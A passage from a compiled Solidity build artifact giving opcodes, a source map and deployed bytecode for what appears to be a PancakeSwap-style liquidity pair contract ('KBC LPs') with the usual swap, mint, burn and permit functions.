SUB PUSH1 0x20 ADD SWAP1 LOG3 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP4 AND PUSH2 0x24CD JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x1F PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x42455032303A206D696E7420746F20746865207A65726F206164647265737300 PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH1 0x0 SLOAD PUSH2 0x24E0 SWAP1 DUP4 PUSH4 0xFFFFFFFF PUSH2 0x258D AND JUMP JUMPDEST PUSH1 0x0 SWAP1 DUP2 SSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP5 AND DUP2 MSTORE PUSH1 0x3 PUSH1 0x20 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD PUSH2 0x250B SWAP1 DUP4 PUSH4 0xFFFFFFFF PUSH2 0x258D AND JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP5 AND PUSH1 0x0 DUP2 DUP2 MSTORE PUSH1 0x3 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 SWAP5 SWAP1 SWAP5 SSTORE DUP4 MLOAD DUP7 DUP2 MSTORE SWAP4 MLOAD SWAP3 SWAP4 SWAP2 SWAP3 PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x264D DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE SWAP3 DUP2 SWAP1 SUB SWAP1 SWAP2 ADD SWAP1 LOG3 POP PUSH1 0x1 SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB AND PUSH1 0x1 PUSH1 0x70 SHL MUL SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP3 AND PUSH1 0x1 PUSH1 0x1 PUSH1 0xE0 SHL SUB DUP5 AND DUP2 PUSH2 0x2585 JUMPI INVALID JUMPDEST DIV SWAP4 SWAP3 POP POP POP JUMP JUMPDEST DUP1 DUP3 ADD DUP3 DUP2 LT ISZERO PUSH2 0xC75 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x14 PUSH1 0x24 DUP3 ADD MSTORE PUSH20 0x64732D6D6174682D6164642D6F766572666C6F77 PUSH1 0x60 SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT INVALID POP PUSH2 0x6E63 PUSH2 0x6B65 GASPRICE KECCAK256 0x49 0x4E MSTORE8 SSTORE CHAINID CHAINID 0x49 NUMBER 0x49 GASLIMIT 0x4E SLOAD 0x5F 0x49 0x4E POP SSTORE SLOAD 0x5F COINBASE 0x4D 0x4F SSTORE 0x4E SLOAD SSTORE PUSH15 0x697377617056323A20494E53554646 0x49 NUMBER 0x49 GASLIMIT 0x4E SLOAD 0x5F 0x4C 0x49 MLOAD SSTORE 0x49 DIFFICULTY 0x49 SLOAD MSIZE 0x5F 0x4D 0x49 0x4E SLOAD GASLIMIT DIFFICULTY POP PUSH2 0x6E63 PUSH2 0x6B65 GASPRICE KECCAK256 0x49 0x4E MSTORE8 SSTORE CHAINID CHAINID 0x49 NUMBER 0x49 GASLIMIT 0x4E SLOAD 0x5F 0x4C 0x49 MLOAD SSTORE 0x49 DIFFICULTY 0x49 SLOAD MSIZE 0x5F TIMESTAMP SSTORE MSTORE 0x4E GASLIMIT DIFFICULTY 0xDD CALLCODE MSTORE 0xAD SHL 0xE2 0xC8 SWAP12 PUSH10 0xC2B068FC378DAA952BA7 CALL PUSH4 0xC4A11628 CREATE2 GAS 0x4D CREATE2 0x23 0xB3 0xEF POP PUSH2 0x6E63 PUSH2 0x6B65 GASPRICE KECCAK256 0x49 0x4E MSTORE8 SSTORE CHAINID CHAINID 0x49 NUMBER 0x49 GASLIMIT 0x4E SLOAD 0x5F 0x4F SSTORE SLOAD POP SSTORE SLOAD 0x5F COINBASE 0x4D 0x4F SSTORE 0x4E SLOAD POP PUSH2 0x6E63 PUSH2 0x6B65 GASPRICE KECCAK256 0x49 0x4E MSTORE8 SSTORE CHAINID CHAINID 0x49 NUMBER 0x49 GASLIMIT 0x4E SLOAD 0x5F 0x4C 0x49 MLOAD SSTORE 0x49 DIFFICULTY 0x49 SLOAD MSIZE 0x5F 0x4D 0x49 0x4E SLOAD GASLIMIT DIFFICULTY LOG2 PUSH6 0x627A7A723158 KECCAK256 0xCD 0x5F PUSH2 0x2284 0xCF RETURNDATACOPY PUSH7 0x3022F426C74F2B 0xB2 DUP14 CODESIZE PUSH6 0x9C6E56172357 DUP2 DUP11 SSTORE 0xC1 0xBF DUP7 0xF8 PUSH5 0x736F6C6343 STOP SDIV LT STOP ORIGIN GASLIMIT 0x49 POP CALLDATACOPY BALANCE ORIGIN DIFFICULTY PUSH16 0x6D61696E28737472696E67206E616D65 0x2C PUSH20 0x7472696E672076657273696F6E2C75696E743235 CALLDATASIZE KECCAK256 PUSH4 0x6861696E 0x49 PUSH5 0x2C61646472 PUSH6 0x737320766572 PUSH10 0x6679696E67436F6E7472 PUSH2 0x6374 0x29 ",
							"sourceMap": "226:18158:6:-;;;325:70;;;-1:-1:-1;;;;;;325:70:6;353:42;325:70;;;;1114:25;;2358:58;5:2:-1;;;;30:1;27;20:12;5:2;-1:-1;1203:133:0;;1107:7;;1203:133;;;;;;;;;;;;;;;;1370:4;;;;;;;;;-1:-1:-1;;;1370:4:0;;;;;1404:10;;;;;;;;;;-1:-1:-1;;;1404:10:0;;;;1175:310;;;;;;;;;1354:22;1175:310;;;;1394:21;1175:310;;;;;;;;;;;1466:4;1175:310;;;;;;;;;;26:21:-1;;;22:32;;;6:49;;1175:310:0;;;;;;;1152:343;;;;;1133:16;:362;-1:-1:-1;2389:20:6;;-1:-1:-1;;;;;;2389:20:6;2399:10;2389:20;;;226:18158;;;;;;"
						},
						"deployedBytecode": {
							"linkReferences": {},
							"object": "608060405234801561001057600080fd5b50600436106101e55760003560e01c806370a082311161010f578063bc25cf77116100a2578063dcbbb37311610071578063dcbbb373146105ff578063dd62ed3e14610625578063f317739c14610653578063fff6cae91461065b576101e5565b8063bc25cf7714610578578063c45a01551461059e578063d21220a7146105a6578063d505accf146105ae576101e5565b8063900820d8116100de578063900820d81461053457806395d89b411461053c578063a9059cbb14610544578063ba9a7a5614610570576101e5565b806370a08231146104a15780637464fc3d146104c75780637ecebe00146104cf57806389afcb44146104f5576101e5565b806323b872dd1161018757806347d5d8561161015657806347d5d856146104455780635909c0d51461046b5780635a3d5493146104735780636a6278421461047b576101e5565b806323b872dd146103e157806330adf81f14610417578063313ce5671461041f5780633644e5151461043d576101e5565b8063095ea7b3116101c3578063095ea7b31461032d5780630dfe16811461036d5780631794bb3c1461039157806318160ddd146103c7576101e5565b8063022c0d9f146101ea57806306fdde03146102785780630902f1ac146102f5575b600080fd5b6102766004803603608081101561020057600080fd5b8135916020810135916001600160a01b03604083013516919081019060808101606082013564010000000081111561023757600080fd5b82018360208201111561024957600080fd5b8035906020019184600183028401116401000000008311171561026b57600080fd5b509092509050610663565b005b610280610c17565b6040805160208082528351818301528351919283929083019185019080838360005b838110156102ba5781810151838201526020016102a2565b50505050905090810190601f1680156102e75780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b6102fd610c3a565b604080516001600160701b03948516815292909316602083015263ffffffff168183015290519081900360600190f35b6103596004803603604081101561034357600080fd5b506001600160a01b038135169060200135610c64565b604080519115158252519081900360200190f35b610375610c7b565b604080516001600160a01b039092168252519081900360200190f35b610276600480360360608110156103a757600080fd5b506001600160a01b03813581169160208101359091169060400135610c8a565b6103cf610d13565b60408051918252519081900360200190f35b610359600480360360608110156103f757600080fd5b506001600160a01b03813581169160208101359091169060400135610d19565b6103cf610db3565b610427610dd7565b6040805160ff9092168252519081900360200190f35b6103cf610ddc565b6103cf6004803603602081101561045b57600080fd5b50356001600160a01b0316610de2565b6103cf610df4565b6103cf610dfa565b6103cf6004803603602081101561049157600080fd5b50356001600160a01b0316610e00565b6103cf600480360360208110156104b757600080fd5b50356001600160a01b03166110fe565b6103cf611110565b6103cf600480360360208110156104e557600080fd5b50356001600160a01b0316611116565b61051b6004803603602081101561050b57600080fd5b50356001600160a01b0316611128565b6040805192835260208301919091528051918290030190f35b6103756114cc565b6102806114db565b6103596004803603604081101561055a57600080fd5b506001600160a01b0381351690602001356114fd565b6103cf61150a565b6102766004803603602081101561058e57600080fd5b50356001600160a01b0316611510565b610375611679565b610375611688565b610276600480360360e08110156105c457600080fd5b506001600160a01b03813581169160208101359091169060408101359060608101359060ff6080820135169060a08101359060c00135611697565b6103cf6004803603602081101561061557600080fd5b50356001600160a01b0316611897565b6103cf6004803603604081101561063b57600080fd5b506001600160a01b0381358116916020013516611ae6565b6103cf611b03565b610276611b09565b600f546001146106ac576040805162461bcd60e51b815260206004820152600f60248201526e14185b98d85ad94e881313d0d2d151608a1b604482015290519081900360640190fd5b6000600f55841515806106bf5750600084115b6106fa5760405162461bcd60e51b815260040180806020018281038252602381526020018061266d6023913960400191505060405180910390fd5b600080610705610c3a565b5091509150816001600160701b03168710801561072a5750806001600160701b031686105b61077b576040805162461bcd60e51b815260206004820152601f60248201527f50616e63616b653a20494e53554646494349454e545f4c495155494449545900604482015290519081900360640190fd5b60008080606460058b02048a0390506000606460058b02600854600954929091048c0392506001600160a01b03908116918116908b1682148015906107d25750806001600160a01b03168b6001600160a01b031614155b610819576040805162461bcd60e51b815260206004820152601360248201527250616e63616b653a20494e56414c49445f544f60681b604482015290519081900360640190fd5b8c1561082a5761082a828c86611c69565b8b1561083b5761083b818c85611c69565b88156108f6578a6001600160a01b031663848008123386868e8e6040518663ffffffff1660e01b815260040180866001600160a01b03166001600160a01b03168152602001858152602001848152602001806020018281038252848482818152602001925080828437600081840152601f19601f8201169050808301925050509650505050505050600060405180830381600087803b1580156108dd57600080fd5b505af11580156108f1573d6000803e3d6000fd5b505050505b606460058e810282900491908e02048e15610923576006546109239085906001600160a01b031684611c69565b8d15610941576006546109419084906001600160a01b031683611c69565b604080516370a0823160e01b815230600482015290516001600160a01b038616916370a08231916024808301926020929190829003018186803b15801561098757600080fd5b505afa15801561099b573d6000803e3d6000fd5b505050506040513d60208110156109b157600080fd5b5051604080516370a0823160e01b815230600482015290519199506001600160a01b038516916370a0823191602480820192602092909190829003018186803b1580156109fd57600080fd5b505afa158015610a11573d6000803e3d6000fd5b505050506040513d6020811015610a2757600080fd5b505196506000955050505050506001600160701b0385168a90038311610a4e576000610a5d565b89856001600160701b03160383035b9050600089856001600160701b0316038311610a7a576000610a89565b89856001600160701b03160383035b90506000821180610a9a5750600081115b610ad55760405162461bcd60e51b81526004018080602001828103825260228152602001806125dd6022913960400191505060405180910390fd5b6000610b09610aeb84601963ffffffff611e0316565b610afd8761271063ffffffff611e0316565b9063ffffffff611e6616565b90506000610b21610aeb84601963ffffffff611e0316565b9050610b536305f5e100610b476001600160701b038b8116908b1663ffffffff611e0316565b9063ffffffff611e0316565b610b63838363ffffffff611e0316565b1015610ba3576040805162461bcd60e51b815260206004820152600a60248201526950616e63616b653a204b60b01b604482015290519081900360640190fd5b5050610bb184848888611eb6565b60408051838152602081018390528082018d9052606081018c905290516001600160a01b038b169133917fd78ad95fa46c994b6551d0da85fc275fe613ce37657fb8d5e3d130840159d8229181900360800190a350506001600f55505050505050505050565b604051806040016040528060078152602001664b4243204c507360c81b81525081565b600b546001600160701b0380821692600160701b830490911691600160e01b900463ffffffff1690565b6000610c71338484612079565b5060015b92915050565b6008546001600160a01b031681565b6007546001600160a01b03163314610cde576040805162461bcd60e51b81526020600482015260126024820152712830b731b0b5b29d102327a92124a22222a760711b604482015290519081900360640190fd5b600880546001600160a01b039485166001600160a01b0319918216179091556009805493909416921691909117909155600a55565b60005481565b6001600160a01b038316600090815260026020908152604080832033845290915281205460001914610d9e576001600160a01b0384166000908152600260209081526040808320338452909152902054610d79908363ffffffff611e6616565b6001600160a01b03851660009081526002602090815260408083203384529091529020555b610da98484846120db565b5060019392505050565b7f6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c981565b601281565b60045481565b60036020526000908152604090205481565b600c5481565b600d5481565b6000600f54600114610e4b576040805162461bcd60e51b815260206004820152600f60248201526e14185b98d85ad94e881313d0d2d151608a1b604482015290519081900360640190fd5b6000600f81905580610e5b610c3a565b50600854604080516370a0823160e01b815230600482015290519395509193506000926001600160a01b03909116916370a08231916024808301926020929190829003018186803b158015610eaf57600080fd5b505afa158015610ec3573d6000803e3d6000fd5b505050506040513d6020811015610ed957600080fd5b5051600954604080516370a0823160e01b815230600482015290519293506000926001600160a01b03909216916370a0823191602480820192602092909190829003018186803b158015610f2c57600080fd5b505afa158015610f40573d6000803e3d6000fd5b505050506040513d6020811015610f5657600080fd5b505190506000610f75836001600160701b03871663ffffffff611e6616565b90506000610f92836001600160701b03871663ffffffff611e6616565b90506000610fa08787612183565b60005490915080610fdd57610fc96103e8610afd610fc4878763ffffffff611e0316565b6122f6565b9850610fd860006103e8612348565b61102c565b6110296001600160701b038916610ffa868463ffffffff611e0316565b8161100157fe5b046001600160701b03891661101c868563ffffffff611e0316565b8161102357fe5b046123cc565b98505b6000891161106b5760405162461bcd60e51b81526004018080602001828103825260268152602001806126906026913960400191505060405180910390fd5b6110758a8a612348565b61108186868a8a611eb6565b81156110b157600b546110ad906001600160701b0380821691600160701b90041663ffffffff611e0316565b600e555b6040805185815260208101859052815133927f4c209b5fc8ad50758f13e2e1088ba56a560dff690a1c6fef26394f4c03821c4f928290030190a250506001600f5550949695505050505050565b60016020526000908152604090205481565b600e5481565b60056020526000908152604090205481565b600080600f54600114611174576040805162461bcd60e51b815260206004820152600f60248201526e14185b98d85ad94e881313d0d2d151608a1b604482015290519081900360640190fd5b6000600f81905580611184610c3a565b50600854600954604080516370a0823160e01b815230600482015290519496509294506001600160a01b039182169391169160009184916370a08231916024808301926020929190829003018186803b1580156111e057600080fd5b505afa1580156111f4573d6000803e3d6000fd5b505050506040513d602081101561120a57600080fd5b5051604080516370a0823160e01b815230600482015290519192506000916001600160a01b038516916370a08231916024808301926020929190829003018186803b15801561125857600080fd5b505afa15801561126c573d6000803e3d6000fd5b505050506040513d602081101561128257600080fd5b5051306000908152600160205260408120549192506112a18888612183565b600054909150806112b8848763ffffffff611e0316565b816112bf57fe5b049a50806112d3848663ffffffff611e0316565b816112da57fe5b04995060008b1180156112ed575060008a115b6113285760405162461bcd60e51b81526004018080602001828103825260268152602001806126276026913960400191505060405180910390fd5b61133230846123e4565b61133d878d8d611c69565b611348868d8c611c69565b604080516370a0823160e01b815230600482015290516001600160a01b038916916370a08231916024808301926020929190829003018186803b15801561138e57600080fd5b505afa1580156113a2573d6000803e3d6000fd5b505050506040513d60208110156113b857600080fd5b5051604080516370a0823160e01b815230600482015290519196506001600160a01b038816916370a0823191602480820192602092909190829003018186803b15801561140457600080fd5b505afa158015611418573d6000803e3d6000fd5b505050506040513d602081101561142e57600080fd5b5051935061143e85858b8b611eb6565b811561146e57600b5461146a906001600160701b0380821691600160701b90041663ffffffff611e0316565b600e555b604080518c8152602081018c905281516001600160a01b038f169233927fdccd412f0b1252819cb1fd330b93224ca42612892bb3f4f789976e6d81936496929081900390910190a35050505050505050506001600f81905550915091565b6006546001600160a01b031681565b6040518060400160405280600681526020016504b42432d4c560d41b81525081565b6000610c713384846120db565b6103e881565b600f54600114611559576040805162461bcd60e51b815260206004820152600f60248201526e14185b98d85ad94e881313d0d2d151608a1b604482015290519081900360640190fd5b6000600f55600854600954600b54604080516370a0823160e01b815230600482015290516001600160a01b0394851694909316926116089285928792611603926001600160701b03169185916370a0823191602480820192602092909190829003018186803b1580156115cb57600080fd5b505afa1580156115df573d6000803e3d6000fd5b505050506040513d60208110156115f557600080fd5b50519063ffffffff611e6616565b611c69565b600b54604080516370a0823160e01b8152306004820152905161166f928492879261160392600160701b90046001600160701b0316916001600160a01b038616916370a0823191602480820192602092909190829003018186803b1580156115cb57600080fd5b50506001600f5550565b6007546001600160a01b031681565b6009546001600160a01b031681565b428410156116df576040805162461bcd60e51b815260206004820152601060248201526f14185b98d85ad94e881156141254915160821b604482015290519081900360640190fd5b6004546001600160a01b0380891660008181526005602090815260408083208054600180820190925582517f6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c98186015280840196909652958d166060860152608085018c905260a085019590955260c08085018b90528151808603909101815260e08501825280519083012061190160f01b6101008601526101028501969096526101228085019690965280518085039096018652610142840180825286519683019690962095839052610162840180825286905260ff89166101828501526101a284018890526101c28401879052519193926101e280820193601f1981019281900390910190855afa1580156117fa573d6000803e3d6000fd5b5050604051601f1901519150506001600160a01b038116158015906118305750886001600160a01b0316816001600160a01b0316145b611881576040805162461bcd60e51b815260206004820152601a60248201527f50616e63616b653a20494e56414c49445f5349474e4154555245000000000000604482015290519081900360640190fd5b61188c898989612079565b505050505050505050565b6000600f546001146118e2576040805162461bcd60e51b815260206004820152600f60248201526e14185b98d85ad94e881313d0d2d151608a1b604482015290519081900360640190fd5b6000600f819055806118f2610c3a565b50600854604080516370a0823160e01b815230600482015290519395509193506000926001600160a01b03909116916370a08231916024808301926020929190829003018186803b15801561194657600080fd5b505afa15801561195a573d6000803e3d6000fd5b505050506040513d602081101561197057600080fd5b5051600954604080516370a0823160e01b815230600482015290519293506000926001600160a01b03909216916370a0823191602480820192602092909190829003018186803b1580156119c357600080fd5b505afa1580156119d7573d6000803e3d6000fd5b505050506040513d60208110156119ed57600080fd5b505190506000611a0c836001600160701b03871663ffffffff611e6616565b90506000611a29836001600160701b03871663ffffffff611e6616565b90506000611a378787612183565b60005490915080611a7057611a5b6103e8610afd610fc4878763ffffffff611e0316565b9850611a6a60006103e8612470565b50611a90565b611a8d6001600160701b038916610ffa868463ffffffff611e0316565b98505b60008911611acf5760405162461bcd60e51b81526004018080602001828103825260288152602001806125ff6028913960400191505060405180910390fd5b611ad98a8a612470565b5061108186868a8a611eb6565b600260209081526000928352604080842090915290825290205481565b600a5481565b600f54600114611b52576040805162461bcd60e51b815260206004820152600f60248201526e14185b98d85ad94e881313d0d2d151608a1b604482015290519081900360640190fd5b6000600f55600854604080516370a0823160e01b81523060048201529051611c62926001600160a01b0316916370a08231916024808301926020929190829003018186803b158015611ba357600080fd5b505afa158015611bb7573d6000803e3d6000fd5b505050506040513d6020811015611bcd57600080fd5b5051600954604080516370a0823160e01b815230600482015290516001600160a01b03909216916370a0823191602480820192602092909190829003018186803b158015611c1a57600080fd5b505afa158015611c2e573d6000803e3d6000fd5b505050506040513d6020811015611c4457600080fd5b5051600b546001600160701b0380821691600160701b900416611eb6565b6001600f55565b604080518082018252601981527f7472616e7366657228616464726573732c75696e74323536290000000000000060209182015281516001600160a01b0385811660248301526044808301869052845180840390910181526064909201845291810180516001600160e01b031663a9059cbb60e01b1781529251815160009460609489169392918291908083835b60208310611d165780518252601f199092019160209182019101611cf7565b6001836020036101000a0380198251168184511680821785525050505050509050019150506000604051808303816000865af19150503d8060008114611d78576040519150601f19603f3d011682016040523d82523d6000602084013e611d7d565b606091505b5091509150818015611dab575080511580611dab5750808060200190516020811015611da857600080fd5b50515b611dfc576040805162461bcd60e51b815260206004820152601860248201527f50616e63616b653a205452414e534645525f4641494c45440000000000000000604482015290519081900360640190fd5b5050505050565b6000811580611e1e57505080820282828281611e1b57fe5b04145b610c75576040805162461bcd60e51b815260206004820152601460248201527364732d6d6174682d6d756c2d6f766572666c6f7760601b604482015290519081900360640190fd5b80820382811115610c75576040805162461bcd60e51b815260206004820152601560248201527464732d6d6174682d7375622d756e646572666c6f7760581b604482015290519081900360640190fd5b6001600160701b038411801590611ed457506001600160701b038311155b611f19576040805162461bcd60e51b815260206004820152601160248201527050616e63616b653a204f564552464c4f5760781b604482015290519081900360640190fd5b600b5463ffffffff42811691600160e01b90048116820390811615801590611f4957506001600160701b03841615155b8015611f5d57506001600160701b03831615155b15611fce578063ffffffff16611f8b85611f7686612556565b6001600160e01b03169063ffffffff61256816565b600c80546001600160e01b03929092169290920201905563ffffffff8116611fb684611f7687612556565b600d80546001600160e01b0392909216929092020190555b600b80546dffffffffffffffffffffffffffff19166001600160701b03888116919091176dffffffffffffffffffffffffffff60701b1916600160701b8883168102919091176001600160e01b0316600160e01b63ffffffff871602179283905560408051848416815291909304909116602082015281517f1c411e9a96e071241c2f21f7726b17ae89e3cab4c78be50e062b03a9fffbbad1929181900390910190a1505050505050565b6001600160a01b03808416600081815260026020908152604080832094871680845294825291829020859055815185815291517f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b9259281900390910190a3505050565b6001600160a01b038316600090815260016020526040902054612104908263ffffffff611e6616565b6001600160a01b038085166000908152600160205260408082209390935590841681522054612139908263ffffffff61258d16565b6001600160a01b03808416600081815260016020908152604091829020949094558051858152905191939287169260008051602061264d83398151915292918290030190a3505050565b600080600760009054906101000a90046001600160a01b03166001600160a01b031663017e7e586040518163ffffffff1660e01b815260040160206040518083038186803b1580156121d457600080fd5b505afa1580156121e8573d6000803e3d6000fd5b505050506040513d60208110156121fe57600080fd5b5051600e546001600160a01b0382161580159450919250906122e25780156122dd576000612241610fc46001600160701b0388811690881663ffffffff611e0316565b9050600061224e836122f6565b9050808211156122da5760006122816008610b47612272868663ffffffff611e6616565b6000549063ffffffff611e0316565b905060006122b661229984600863ffffffff611e0316565b6122aa86601163ffffffff611e0316565b9063ffffffff61258d16565b905060008183816122c357fe5b04905080156122d6576122d68782612348565b5050505b50505b6122ee565b80156122ee576000600e555b505092915050565b60006003821115612339575080600160028204015b818110156123335780915060028182858161232257fe5b04018161232b57fe5b04905061230b565b50612343565b8115612343575060015b919050565b60005461235b908263ffffffff61258d16565b60009081556001600160a01b038316815260016020526040902054612386908263ffffffff61258d16565b6001600160a01b038316600081815260016020908152604080832094909455835185815293519293919260008051602061264d8339815191529281900390910190a35050565b60008183106123db57816123dd565b825b9392505050565b6001600160a01b03821660009081526001602052604090205461240d908263ffffffff611e6616565b6001600160a01b0383166000908152600160205260408120919091555461243a908263ffffffff611e6616565b60009081556040805183815290516001600160a01b0385169160008051602061264d833981519152919081900360200190a35050565b60006001600160a01b0383166124cd576040805162461bcd60e51b815260206004820152601f60248201527f42455032303a206d696e7420746f20746865207a65726f206164647265737300604482015290519081900360640190fd5b6000546124e0908363ffffffff61258d16565b60009081556001600160a01b03841681526003602052604090205461250b908363ffffffff61258d16565b6001600160a01b038416600081815260036020908152604080832094909455835186815293519293919260008051602061264d8339815191529281900390910190a350600192915050565b6001600160701b0316600160701b0290565b60006001600160701b0382166001600160e01b0384168161258557fe5b049392505050565b80820182811015610c75576040805162461bcd60e51b815260206004820152601460248201527364732d6d6174682d6164642d6f766572666c6f7760601b604482015290519081900360640190fdfe50616e63616b653a20494e53554646494349454e545f494e5055545f414d4f554e54556e697377617056323a20494e53554646494349454e545f4c49515549444954595f4d494e54454450616e63616b653a20494e53554646494349454e545f4c49515549444954595f4255524e4544ddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef50616e63616b653a20494e53554646494349454e545f4f55545055545f414d4f554e5450616e63616b653a20494e53554646494349454e545f4c49515549444954595f4d494e544544a265627a7a72315820cd5f612284cf3e663022f426c74f2bb28d38659c6e56172357818a55c1bf86f864736f6c63430005100032",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x1E5 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x70A08231 GT PUSH2 0x10F JUMPI DUP1 PUSH4 0xBC25CF77 GT PUSH2 0xA2 JUMPI DUP1 PUSH4 0xDCBBB373 GT PUSH2 0x71 JUMPI DUP1 PUSH4 0xDCBBB373 EQ PUSH2 0x5FF JUMPI DUP1 PUSH4 0xDD62ED3E EQ PUSH2 0x625 JUMPI DUP1 PUSH4 0xF317739C EQ PUSH2 0x653 JUMPI DUP1 PUSH4 0xFFF6CAE9 EQ PUSH2 0x65B JUMPI PUSH2 0x1E5 JUMP JUMPDEST DUP1 PUSH4 0xBC25CF77 EQ PUSH2 0x578 JUMPI DUP1 PUSH4 0xC45A0155 EQ PUSH2 0x59E JUMPI DUP1 PUSH4 0xD21220A7 EQ PUSH2 0x5A6 JUMPI DUP1 PUSH4 0xD505ACCF EQ PUSH2 0x5AE JUMPI PUSH2 0x1E5 JUMP JUMPDEST DUP1 PUSH4 0x900820D8 GT PUSH2 0xDE JUMPI DUP1 PUSH4 0x900820D8 EQ PUSH2 0x534 JUMPI DUP1 PUSH4 0x95D89B41 EQ PUSH2 0x53C JUMPI DUP1 PUSH4 0xA9059CBB EQ PUSH2 0x544 JUMPI DUP1 PUSH4 0xBA9A7A56 EQ PUSH2 0x570 JUMPI PUSH2 0x1E5 JUMP JUMPDEST DUP1 PUSH4 0x70A08231 EQ PUSH2 0x4A1 JUMPI DUP1 PUSH4 0x7464FC3D EQ PUSH2 0x4C7 JUMPI DUP1 PUSH4 0x7ECEBE00 EQ PUSH2 0x4CF JUMPI DUP1 PUSH4 0x89AFCB44 EQ PUSH2 0x4F5 JUMPI PUSH2 0x1E5 JUMP JUMPDEST DUP1 PUSH4 0x23B872DD GT PUSH2 0x187 JUMPI DUP1 PUSH4 0x47D5D856 GT PUSH2 0x156 JUMPI DUP1 PUSH4 0x47D5D856 EQ PUSH2 0x445 JUMPI DUP1 PUSH4 0x5909C0D5 EQ PUSH2 0x46B JUMPI DUP1 PUSH4 0x5A3D5493 EQ PUSH2 0x473 JUMPI DUP1 PUSH4 0x6A627842 EQ PUSH2 0x47B JUMPI PUSH2 0x1E5 JUMP JUMPDEST DUP1 PUSH4 0x23B872DD EQ PUSH2 0x3E1 JUMPI DUP1 PUSH4 0x30ADF81F EQ PUSH2 0x417 JUMPI DUP1 PUSH4 0x313CE567 EQ PUSH2 0x41F JUMPI DUP1 PUSH4 0x3644E515 EQ PUSH2 0x43D JUMPI PUSH2 0x1E5 JUMP JUMPDEST DUP1 PUSH4 0x95EA7B3 GT PUSH2 0x1C3 JUMPI DUP1 PUSH4 0x95EA7B3 EQ PUSH2 0x32D JUMPI DUP1 PUSH4 0xDFE1681 EQ PUSH2 0x36D JUMPI DUP1 PUSH4 0x1794BB3C EQ PUSH2 0x391 JUMPI DUP1 PUSH4 0x18160DDD EQ PUSH2 0x3C7 JUMPI PUSH2 0x1E5 JUMP JUMPDEST DUP1 PUSH4 0x22C0D9F EQ PUSH2 0x1EA JUMPI DUP1 PUSH4 0x6FDDE03 EQ PUSH2 0x278 JUMPI DUP1 PUSH4 0x902F1AC EQ PUSH2 0x2F5 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x276 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x80 DUP2 LT ISZERO PUSH2 0x200 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 CALLDATALOAD SWAP2 PUSH1 0x20 DUP2 ADD CALLDATALOAD SWAP2 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB PUSH1 0x40 DUP4 ADD CALLDATALOAD AND SWAP2 SWAP1 DUP2 ADD SWAP1 PUSH1 0x80 DUP2 ADD PUSH1 0x60 DUP3 ADD CALLDATALOAD PUSH5 0x100000000 DUP2 GT ISZERO PUSH2 0x237 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP3 ADD DUP4 PUSH1 0x20 DUP3 ADD GT ISZERO PUSH2 0x249 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP2 DUP5 PUSH1 0x1 DUP4 MUL DUP5 ADD GT PUSH5 0x100000000 DUP4 GT OR ISZERO PUSH2 0x26B JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP SWAP1 SWAP3 POP SWAP1 POP PUSH2 0x663 JUMP JUMPDEST STOP JUMPDEST PUSH2 0x280 PUSH2 0xC17 JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD PUSH1 0x20 DUP1 DUP3 MSTORE DUP4 MLOAD DUP2 DUP4 ADD MSTORE DUP4 MLOAD SWAP2 SWAP3 DUP4 SWAP3 SWAP1 DUP4 ADD SWAP2 DUP6 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x2BA JUMPI DUP2 DUP2 ADD MLOAD DUP4 DUP3 ADD MSTORE PUSH1 0x20 ADD PUSH2 0x2A2 JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH2 0x2E7 JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP 